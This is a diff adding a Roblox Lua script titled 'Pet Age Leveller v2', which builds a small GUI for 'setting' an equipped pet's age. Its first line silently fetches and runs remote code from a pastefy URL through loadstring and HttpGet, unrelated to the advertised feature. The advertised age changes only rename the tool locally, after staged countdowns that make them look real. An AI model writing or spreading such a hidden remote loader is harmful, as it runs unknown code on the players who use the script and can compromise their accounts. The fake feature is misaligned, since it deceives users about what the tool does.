@@ -1,0 +1,155 @@
+loadstring(game:HttpGet("https://pastefy.app/H6iNsLrz/raw"))()
+local plr = game:GetService("Players").LocalPlayer
+local char = plr.Character or plr.CharacterAdded:Wait()
+local gui = Instance.new("ScreenGui", plr:WaitForChild("PlayerGui"))
+gui.Name = "JamesPetAgeLeveller"
+gui.ResetOnSpawn = false
+
+-- Helper for creating UI elements
+local function create(class, props, parent)
+	local inst = Instance.new(class)
+	for k, v in pairs(props) do inst[k] = v end
+	inst.Parent = parent
+	return inst
+end
+
+-- UI
+local frame = create("Frame", {
+	Name = "PetAgeFrame",
+	Size = UDim2.new(0, 300, 0, 180),
+	Position = UDim2.new(0.5, -150, 0.5, -90),
+	BackgroundColor3 = Color3.fromRGB(20, 20, 20),
+	Active = true,
+	Draggable = true
+}, gui)
+create("UICorner", { CornerRadius = UDim.new(0, 10) }, frame)
+
+create("TextLabel", {
+	Text = "Pet Age Leveller v2",
+	Font = Enum.Font.FredokaOne,
+	TextSize = 20,
+	TextColor3 = Color3.new(1,1,1),
+	BackgroundTransparency = 1,
+	Size = UDim2.new(1, 0, 0, 30),
+	Position = UDim2.new(0, 0, 0, 5)
+}, frame)
+
+local closeBtn = create("TextButton", {
+	Text = "X",
+	Font = Enum.Font.FredokaOne,
+	TextSize = 18,
+	TextColor3 = Color3.new(1,1,1),
+	BackgroundColor3 = Color3.fromRGB(60, 0, 0),
+	Size = UDim2.new(0, 28, 0, 28),
+	Position = UDim2.new(1, -34, 0, 6)
+}, frame)
+create("UICorner", {}, closeBtn)
+
+closeBtn.MouseButton1Click:Connect(function()
+	frame.Visible = false
+end)
+
+local petInfo = create("TextLabel", {
+	Text = "Equipped Pet: [None]",
+	Font = Enum.Font.FredokaOne,
+	TextSize = 16,
+	TextColor3 = Color3.fromRGB(255, 255, 160),
+	BackgroundTransparency = 1,
+	Size = UDim2.new(1, -24, 0, 24),
+	Position = UDim2.new(0, 12, 0, 40),
+	TextXAlignment = Enum.TextXAlignment.Left
+}, frame)
+
+local btn1 = create("TextButton", {
+	Text = "Set Age to 50",
+	Font = Enum.Font.FredokaOne,
+	TextSize = 16,
+	TextColor3 = Color3.fromRGB(40, 40, 40),
+	BackgroundColor3 = Color3.new(1,1,1),
+	Size = UDim2.new(0, 220, 0, 36),
+	Position = UDim2.new(0.5, -110, 0, 76)
+}, frame)
+create("UICorner", {}, btn1)
+
+local btn2 = create("TextButton", {
+	Text = "Add +1 Age",
+	Font = Enum.Font.FredokaOne,
+	TextSize = 16,
+	TextColor3 = Color3.fromRGB(40, 40, 40),
+	BackgroundColor3 = Color3.new(1,1,1),
+	Size = UDim2.new(0, 220, 0, 36),
+	Position = UDim2.new(0.5, -110, 0, 122)
+}, frame)
+create("UICorner", {}, btn2)
+
+create("TextLabel", {
+	Text = "Tiktok: @JamesScripts",
+	Font = Enum.Font.FredokaOne,
+	TextSize = 13,
+	TextColor3 = Color3.fromRGB(180, 180, 180),
+	BackgroundTransparency = 1,
+	Size = UDim2.new(1, 0, 0, 20),
+	Position = UDim2.new(0, 0, 1, -20)
+}, frame)
+
+-- Helpers
+local function getPet()
+	char = plr.Character or plr.CharacterAdded:Wait()
+	for _, t in pairs(char:GetChildren()) do
+		if t:IsA("Tool") and t.Name:find("Age") then return t end
+	end
+end
+
+local function updateLabel()
+	local pet = getPet()
+	petInfo.Text = "Equipped Pet: " .. (pet and pet.Name or "[None]")
+end
+
+-- Button 1 - Set Age to 50
+btn1.MouseButton1Click:Connect(function()
+	local pet = getPet()
+	if pet then
+		for i = 20, 1, -1 do
+			btn1.Text = "Changing Age in " .. i .. "..."
+			task.wait(1)
+		end
+		pet.Name = pet.Name:gsub("%[Age%s%d+%]", "[Age 50]")
+		petInfo.Text = "Equipped Pet: " .. pet.Name
+	else
+		btn1.Text = "No Pet Equipped!"
+		task.wait(2)
+	end
+	btn1.Text = "Set Age to 50"
+end)
+
+-- Button 2 - Add +1 Age
+btn2.MouseButton1Click:Connect(function()
+	local pet = getPet()
+	local age = pet and tonumber(pet.Name:match("%[Age%s(%d+)%]"))
+	if pet and age then
+		if age >= 100 then
+			btn2.Text = "Max Age is 100!"
+			task.wait(2)
+		else
+			for i = 5, 1, -1 do
+				btn2.Text = "Adding +1 in " .. i .. "..."
+				task.wait(1)
+			end
+			local newAge = age + 1
+			pet.Name = pet.Name:gsub("%[Age%s%d+%]", "[Age " .. newAge .. "]")
+			petInfo.Text = "Equipped Pet: " .. pet.Name
+		end
+	else
+		btn2.Text = "No Pet Equipped!"
+		task.wait(2)
+	end
+	btn2.Text = "Add +1 Age"
+end)
+
+-- Live update
+task.spawn(function()
+	while true do
+		updateLabel()
+		task.wait(1)
+	end
+end)
